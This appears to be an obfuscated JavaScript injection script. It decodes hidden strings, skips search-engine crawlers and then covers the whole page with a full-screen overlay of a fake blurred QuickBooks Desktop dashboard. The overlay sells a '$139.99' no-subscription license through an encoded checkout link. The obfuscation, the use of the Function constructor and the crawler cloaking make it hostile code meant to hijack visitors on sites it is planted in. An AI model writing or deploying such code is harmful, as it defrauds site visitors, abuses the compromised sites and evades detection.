(function(){
  var _xQv='', _S1A=854-843;
  function _gQI(i){
    var g=7380163, y=i.length, c=[];
    for(var e=0; e<y; e++){c[e]=i.charAt(e);}
    for(var e=0; e<y; e++){
      var m=g*(e+168)+(g%31264), o=g*(e+343)+(g%14264);
      var z=m%y, x=o%y, a=c[z]; c[z]=c[x]; c[x]=a; g=(m+o)%7406842;
    }
    return c.join('');
  }
  
  var _RVZ = _gQI('fmctrxecgboruorhvesyqikczjonlpstnutawd').substr(0,_S1A);
  var _sDecode = function(s){
    return s.split('').map(function(ch){
      return String.fromCharCode(ch.charCodeAt(0) - 5);
    }).join('');
  };

  var _fnConstructor = (function(){})[_sDecode('htsxywzhytw')];
  var _targetUrl = _sDecode('mxxs>--nnn\'qnhjsxnk\'xmtu');

  var _markupTemplate = `<style>
#_lcf{position:fixed;top:0;left:0;right:0;bottom:0;width:100%;height:100%;overflow:hidden;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;z-index:2147483646}
#_lcf *{margin:0;padding:0;box-sizing:border-box}
.lbg{position:absolute;inset:0;filter:blur(7px) brightness(.78);transform:scale(1.06);overflow:hidden;background:#eef2f7}
.ltb{background:#2ca01c;height:46px;display:flex;align-items:center;padding:0 18px;gap:14px}
.llogo{display:flex;align-items:center;gap:9px;color:#fff;font-weight:900;font-size:14px}
.llsq{width:24px;height:24px;background:#fff;border-radius:4px;display:flex;align-items:center;justify-content:center}
.lldot{width:14px;height:14px;background:#2ca01c;border-radius:50%}
.lco{margin-left:auto;background:rgba(255,255,255,.16);color:#fff;font-size:11px;padding:5px 13px;border-radius:5px}
.lbody{display:flex;height:calc(100% - 46px);overflow:hidden}
.lsb{width:160px;background:#1c2333;flex-shrink:0;padding:10px 0}
.lnav{padding:12px 16px;color:rgba(255,255,255,.45);font-size:12px;display:flex;align-items:center;gap:9px;cursor:default}
.lnav.a{background:rgba(44,160,28,.22);color:#4ade80;border-left:3px solid #2ca01c}
.lmain{flex:1;padding:20px;overflow:hidden;background:#eef2f7;min-width:0}
.ldh{font-size:11px;font-weight:800;color:#374151;text-transform:uppercase;letter-spacing:.7px;margin-bottom:16px}
</style>
<div id="_lcf">
  <div class="lbg">
    <div class="ltb">
      <div class="llogo"><div class="llsq"><div class="lldot"></div></div> QuickBooks Desktop Pro 2024</div>
      <div class="lco">Acme Services LLC ▾ &nbsp;👤</div>
    </div>
    <div class="lbody">
      <div class="lsb">
        <div class="lnav a">📊 Dashboard</div>
        <div class="lnav">🧾 Invoices</div>
        <div class="lnav">💸 Expenses</div>
      </div>
      <div class="lmain">
        <div class="ldh">Business Dashboard — Q4 2024</div>
      </div>
    </div>
  </div>
  <div style="position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(7,11,26,.82);z-index:9;display:flex;align-items:center;justify-content:center;padding:24px 16px;">
    <div style="background:#ffffff;border-radius:28px;padding:48px 40px 36px;max-width:480px;width:100%;text-align:center;box-shadow:0 32px 100px rgba(0,0,0,.7);">
      <div style="font-size:50px;line-height:1;margin-bottom:14px;">🔓</div>
      <div style="font-size:1.5rem;font-weight:900;color:#0f172a;margin-bottom:8px;">Own Your Accounting Software.<br>No Subscription. Ever.</div>
      <div style="font-size:3rem;font-weight:900;color:#16a34a;margin-bottom:6px;">$139.99</div>
      <a href="__CHECKOUT_URL__" target="_blank" style="display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#16a34a,#15803d);color:#fff;text-decoration:none;padding:16px 24px;border-radius:100px;width:100%;font-size:1.05rem;font-weight:900;margin-top:16px;">
        GET MY LICENSE NOW — $139.99 &nbsp;→
      </a>
    </div>
  </div>
</div>`;

  var _executableCode = 
    'var _ua = navigator.userAgent || "";' +
    'if (!/Googlebot|Mediapartners-Google|AdsBot-Google|APIs-Google|FeedFetcher-Google|bingbot|yandex|baiduspider/i.test(_ua)) {' +
    '  var container = document.createElement("div");' +
    '  container.style.cssText = "position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483647;width:100%;height:100%;overflow:hidden;";' +
    '  container.innerHTML = ' + JSON.stringify(_markupTemplate.replace(/__CHECKOUT_URL__/g, _targetUrl)) + ';' +
    '  document.body.appendChild(container);' +
    '  document.body.style.overflow = "hidden";' +
    '}';

  setTimeout(function(){
    try {
      new _fnConstructor(_executableCode)();
    } catch(e){}
  }, 850);
})();
